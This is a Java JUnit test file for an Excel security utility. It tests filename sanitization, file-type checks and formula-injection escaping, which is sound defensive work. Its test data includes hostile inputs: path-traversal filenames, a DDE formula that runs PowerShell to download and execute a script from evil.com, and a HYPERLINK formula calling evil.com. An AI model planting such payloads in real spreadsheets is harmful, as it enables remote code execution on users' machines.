package com.foo.excel.util;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullSource;
import org.junit.jupiter.params.provider.ValueSource;

class SecureExcelUtilsTest {

  @TempDir Path tempDir;

  // ========== sanitizeFilename 테스트 ==========

  @ParameterizedTest
  @NullSource
  @ValueSource(strings = {"", "   ", "\t", "\n"})
  void sanitizeFilename_nullOrBlank_throws(String input) {
    assertThatThrownBy(() -> SecureExcelUtils.sanitizeFilename(input))
        .isInstanceOf(IllegalArgumentException.class);
  }

  @Test
  void sanitizeFilename_pathTraversal_extractsFilenameOnly() {
    String result = SecureExcelUtils.sanitizeFilename("../../../etc/passwd.xlsx");
    assertThat(result).doesNotContain("..");
    assertThat(result).doesNotContain("/");
    assertThat(result).endsWith(".xlsx");
  }

  @Test
  void sanitizeFilename_windowsPathTraversal_extractsFilenameOnly() {
    String result = SecureExcelUtils.sanitizeFilename("..\\..\\Windows\\System32\\config.xlsx");
    assertThat(result).doesNotContain("..");
    assertThat(result).doesNotContain("\\");
    assertThat(result).endsWith(".xlsx");
  }

  @Test
  void sanitizeFilename_absolutePath_extractsFilenameOnly() {
    String result = SecureExcelUtils.sanitizeFilename("/var/tmp/uploads/data.xlsx");
    assertThat(result).isEqualTo("data.xlsx");
  }

  @Test
  void sanitizeFilename_windowsAbsolutePath_extractsFilenameOnly() {
    String result = SecureExcelUtils.sanitizeFilename("C:\\Users\\Admin\\Documents\\data.xlsx");
    assertThat(result).isEqualTo("data.xlsx");
  }

  @Test
  void sanitizeFilename_nullBytesRemoved() {
    String result = SecureExcelUtils.sanitizeFilename("test\u0000.xlsx");
    assertThat(result).doesNotContain("\u0000");
    assertThat(result).isEqualTo("test.xlsx");
  }

  @Test
  void sanitizeFilename_controlCharactersRemoved() {
    String result = SecureExcelUtils.sanitizeFilename("test\u0001\u0002file.xlsx");
    assertThat(result).isEqualTo("testfile.xlsx");
  }

  @Test
  void sanitizeFilename_consecutiveDotsNormalized() {
    String result = SecureExcelUtils.sanitizeFilename("test..file.xlsx");
    assertThat(result).doesNotContain("..");
  }

  @Test
  void sanitizeFilename_validXlsx_passesThrough() {
    String result = SecureExcelUtils.sanitizeFilename("data_import_2024.xlsx");
    assertThat(result).isEqualTo("data_import_2024.xlsx");
  }

  @Test
  void sanitizeFilename_xlsExtension_rejected() {
    assertThatThrownBy(() -> SecureExcelUtils.sanitizeFilename("legacy_data.xls"))
        .isInstanceOf(IllegalArgumentException.class)
        .hasMessageContaining("extension");
  }

  @Test
  void sanitizeFilename_koreanCharacters_preserved() {
    String result = SecureExcelUtils.sanitizeFilename("관세양허표.xlsx");
    assertThat(result).isEqualTo("관세양허표.xlsx");
  }

  @ParameterizedTest
  @ValueSource(strings = {"data.csv", "data.txt", "data.pdf", "data", "data.exe"})
  void sanitizeFilename_invalidExtension_throws(String filename) {
    assertThatThrownBy(() -> SecureExcelUtils.sanitizeFilename(filename))
        .isInstanceOf(IllegalArgumentException.class)
        .hasMessageContaining("extension");
  }

  @Test
  void sanitizeFilename_leadingDotsStripped() {
    String result = SecureExcelUtils.sanitizeFilename("...test.xlsx");
    assertThat(result).doesNotStartWith(".");
  }

  @Test
  void sanitizeFilename_trailingSpacesStripped() {
    String result = SecureExcelUtils.sanitizeFilename("test.xlsx   ");
    assertThat(result).isEqualTo("test.xlsx");
  }

  @Test
  void sanitizeFilename_specialCharactersReplaced() {
    String result = SecureExcelUtils.sanitizeFilename("test<>:\"|?*file.xlsx");
    assertThat(result).doesNotContain("<", ">", ":", "\"", "|", "?", "*");
  }

  // ========== validateFileContent 테스트 ==========

  @Test
  void validateFileContent_validXlsx_passes() throws IOException {
    Path xlsxFile = createValidXlsxFile();
    assertThatCode(() -> SecureExcelUtils.validateFileContent(xlsxFile)).doesNotThrowAnyException();
  }

  @Test
  void validateFileContent_xlsExtension_rejected() throws IOException {
    Path xlsFile = tempDir.resolve("valid.xls");
    Files.write(xlsFile, new byte[] {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0});

    assertThatThrownBy(() -> SecureExcelUtils.validateFileContent(xlsFile))
        .isInstanceOf(SecurityException.class)
        .hasMessageContaining(".xlsx");
  }

  @Test
  void validateFileContent_xlsxWithWrongMagicBytes_throwsSecurityException() throws IOException {
    // .xlsx 확장자지만 PDF 내용인 파일 생성
    Path fakeXlsx = tempDir.resolve("fake.xlsx");
    Files.write(fakeXlsx, new byte[] {0x25, 0x50, 0x44, 0x46}); // %PDF 매직 바이트

    assertThatThrownBy(() -> SecureExcelUtils.validateFileContent(fakeXlsx))
        .isInstanceOf(SecurityException.class)
        .hasMessageContaining("XLSX");
  }

  @Test
  void validateFileContent_tooSmallFile_throwsIOException() throws IOException {
    Path tinyFile = tempDir.resolve("tiny.xlsx");
    Files.write(tinyFile, new byte[] {0x50}); // 1바이트만 존재

    assertThatThrownBy(() -> SecureExcelUtils.validateFileContent(tinyFile))
        .isInstanceOf(IOException.class)
        .hasMessageContaining("too small");
  }

  @Test
  void validateFileContent_xlsxContainingXlsContent_throwsSecurityException() throws IOException {
    // .xlsx 확장자지만 XLS 매직 바이트인 파일 생성
    Path mixedFile = tempDir.resolve("mixed.xlsx");
    Files.write(
        mixedFile,
        new byte[] {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, 0x00, 0x00, 0x00, 0x00});

    assertThatThrownBy(() -> SecureExcelUtils.validateFileContent(mixedFile))
        .isInstanceOf(SecurityException.class)
        .hasMessageContaining("XLSX");
  }

  // ========== validateStreamContent 테스트 ==========

  @Test
  void validateStreamContent_validXlsxStream_passes() throws IOException {
    byte[] xlsxMagic = {0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x00, 0x00};
    ByteArrayInputStream stream = new ByteArrayInputStream(xlsxMagic);

    assertThatCode(() -> SecureExcelUtils.validateStreamContent(stream, "xlsx"))
        .doesNotThrowAnyException();
  }

  @Test
  void validateStreamContent_xlsValidation_rejected() throws IOException {
    byte[] xlsMagic = {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, 0x00, 0x00, 0x00, 0x00};
    ByteArrayInputStream stream = new ByteArrayInputStream(xlsMagic);

    assertThatThrownBy(() -> SecureExcelUtils.validateStreamContent(stream, "xls"))
        .isInstanceOf(SecurityException.class)
        .hasMessageContaining("xlsx");
  }

  @Test
  void validateStreamContent_invalidXlsxStream_throwsSecurityException() throws IOException {
    byte[] invalidContent = "Hello World!".getBytes();
    ByteArrayInputStream stream = new ByteArrayInputStream(invalidContent);

    assertThatThrownBy(() -> SecureExcelUtils.validateStreamContent(stream, "xlsx"))
        .isInstanceOf(SecurityException.class)
        .hasMessageContaining("XLSX");
  }

  @Test
  void validateStreamContent_tooSmallStream_throwsSecurityException() throws IOException {
    byte[] tinyContent = {0x50, 0x4B}; // 2바이트만 존재
    ByteArrayInputStream stream = new ByteArrayInputStream(tinyContent);

    assertThatThrownBy(() -> SecureExcelUtils.validateStreamContent(stream, "xlsx"))
        .isInstanceOf(SecurityException.class)
        .hasMessageContaining("too small");
  }

  // ========== sanitizeForExcelCell 테스트 ==========

  @Test
  void sanitizeForExcelCell_null_returnsNull() {
    assertThat(SecureExcelUtils.sanitizeForExcelCell(null)).isNull();
  }

  @Test
  void sanitizeForExcelCell_emptyString_returnsEmpty() {
    assertThat(SecureExcelUtils.sanitizeForExcelCell("")).isEmpty();
  }

  @Test
  void sanitizeForExcelCell_normalText_unchanged() {
    String input = "Regular cell content";
    assertThat(SecureExcelUtils.sanitizeForExcelCell(input)).isEqualTo(input);
  }

  @Test
  void sanitizeForExcelCell_equalsSign_prefixedWithQuote() {
    String input = "=SUM(A1:A10)";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
    assertThat(result).isEqualTo("'" + input);
  }

  @Test
  void sanitizeForExcelCell_plusSign_prefixedWithQuote() {
    String input = "+1234567890";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
  }

  @Test
  void sanitizeForExcelCell_minusSign_prefixedWithQuote() {
    String input = "-cmd|'/C calc'!A0";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
  }

  @Test
  void sanitizeForExcelCell_atSign_prefixedWithQuote() {
    String input = "@SUM(A1:A10)";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
  }

  @Test
  void sanitizeForExcelCell_tabCharacter_prefixedWithQuote() {
    String input = "\t=malicious()";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
  }

  @Test
  void sanitizeForExcelCell_carriageReturn_prefixedWithQuote() {
    String input = "\r=malicious()";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
  }

  @Test
  void sanitizeForExcelCell_newline_prefixedWithQuote() {
    String input = "\n=malicious()";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
  }

  @Test
  void sanitizeForExcelCell_ddeAttackPayload_prefixedWithQuote() {
    // DDE(Dynamic Data Exchange) 공격 페이로드
    String input =
        "=cmd|'/C powershell -ep bypass -noprofile -command \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'))\"'!A0";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
    assertThat(result).isEqualTo("'" + input);
  }

  @Test
  void sanitizeForExcelCell_hyperlinkFormula_prefixedWithQuote() {
    String input = "=HYPERLINK(\"http://evil.com?\")";
    String result = SecureExcelUtils.sanitizeForExcelCell(input);
    assertThat(result).startsWith("'");
  }

  // ========== countRows 테스트 ==========

  @Test
  void countRows_returnsCorrectCount() throws IOException {
    Path file = createXlsxWithRows(25);

    int count = SecureExcelUtils.countRows(file, 0);

    // 헤더 1행 + 데이터 25행 = 총 row 요소 26개
    assertThat(count).isEqualTo(26);
  }

  @Test
  void countRows_emptySheet_returnsZero() throws IOException {
    try (XSSFWorkbook wb = new XSSFWorkbook()) {
      wb.createSheet("Empty");
      Path file = tempDir.resolve("empty.xlsx");
      try (OutputStream os = Files.newOutputStream(file)) {
        wb.write(os);
      }

      assertThat(SecureExcelUtils.countRows(file, 0)).isZero();
    }
  }

  @Test
  void countRows_selectsCorrectSheet() throws IOException {
    try (XSSFWorkbook wb = new XSSFWorkbook()) {
      // 시트 0: 3행
      Sheet s0 = wb.createSheet("Sheet0");
      for (int i = 0; i < 3; i++) s0.createRow(i).createCell(0).setCellValue(i);

      // 시트 1: 7행
      Sheet s1 = wb.createSheet("Sheet1");
      for (int i = 0; i < 7; i++) s1.createRow(i).createCell(0).setCellValue(i);

      Path file = tempDir.resolve("multi_sheet.xlsx");
      try (OutputStream os = Files.newOutputStream(file)) {
        wb.write(os);
      }

      assertThat(SecureExcelUtils.countRows(file, 0)).isEqualTo(3);
      assertThat(SecureExcelUtils.countRows(file, 1)).isEqualTo(7);
    }
  }

  @Test
  void countRows_invalidSheetIndex_throwsIOException() throws IOException {
    Path file = createValidXlsxFile();

    assertThatThrownBy(() -> SecureExcelUtils.countRows(file, 5))
        .isInstanceOf(IOException.class)
        .hasMessageContaining("Sheet index");
  }

  // ========== createWorkbook 테스트 ==========

  @Test
  void createWorkbook_validXlsxFile_returnsWorkbook() throws IOException {
    Path xlsxFile = createValidXlsxFile();

    try (Workbook workbook = SecureExcelUtils.createWorkbook(xlsxFile)) {
      assertThat(workbook).isNotNull();
      assertThat(workbook.getNumberOfSheets()).isEqualTo(1);
    }
  }

  @Test
  void createWorkbook_xlsFile_rejected() throws IOException {
    Path xlsFile = tempDir.resolve("valid.xls");
    Files.write(xlsFile, new byte[] {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0});

    assertThatThrownBy(() -> SecureExcelUtils.createWorkbook(xlsFile))
        .isInstanceOf(SecurityException.class)
        .hasMessageContaining(".xlsx");
  }

  @Test
  void createWorkbook_invalidXlsxContent_throws() throws IOException {
    Path fakeXlsx = tempDir.resolve("fake.xlsx");
    Files.write(fakeXlsx, "Not a valid Excel file".getBytes());

    assertThatThrownBy(() -> SecureExcelUtils.createWorkbook(fakeXlsx))
        .isInstanceOf(SecurityException.class);
  }

  @Test
  void createWorkbook_pathVariant_worksIdentically() throws IOException {
    Path xlsxFile = createValidXlsxFile();

    try (Workbook workbook = SecureExcelUtils.createWorkbook(xlsxFile.toFile())) {
      assertThat(workbook).isNotNull();
    }
  }

  // ========== 헬퍼 메서드 =========

  private Path createValidXlsxFile() throws IOException {
    try (XSSFWorkbook wb = new XSSFWorkbook()) {
      Sheet sheet = wb.createSheet("TestSheet");
      sheet.createRow(0).createCell(0).setCellValue("Test");

      Path file = tempDir.resolve("valid.xlsx");
      try (OutputStream os = Files.newOutputStream(file)) {
        wb.write(os);
      }
      return file;
    }
  }

  private Path createXlsxWithRows(int dataRows) throws IOException {
    try (XSSFWorkbook wb = new XSSFWorkbook()) {
      Sheet sheet = wb.createSheet("Sheet1");
      sheet.createRow(0).createCell(0).setCellValue("Header");
      for (int i = 0; i < dataRows; i++) {
        sheet.createRow(i + 1).createCell(0).setCellValue("Row" + i);
      }
      Path file = tempDir.resolve("rows_" + dataRows + ".xlsx");
      try (OutputStream os = Files.newOutputStream(file)) {
        wb.write(os);
      }
      return file;
    }
  }
}
